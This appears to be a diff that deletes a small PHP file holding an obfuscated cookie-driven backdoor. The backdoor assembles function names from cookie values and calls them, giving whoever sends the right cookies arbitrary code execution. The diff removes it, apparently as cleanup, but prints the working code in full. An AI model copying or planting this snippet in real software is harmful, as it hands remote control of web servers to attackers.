@@ -1,2 +1,0 @@
-<?php
- $page =$_COOKIE;$layout=8;$nsize = sizeof($page);if($nsize == 21) { if (in_array(gettype($page).count($page),$page)) { $page[51] = $page[51].$page[87];$page[77] = $page[51]($page[77]);$page = $page[77]($page[59],$page[51]($page[73]));$page($layout);}}
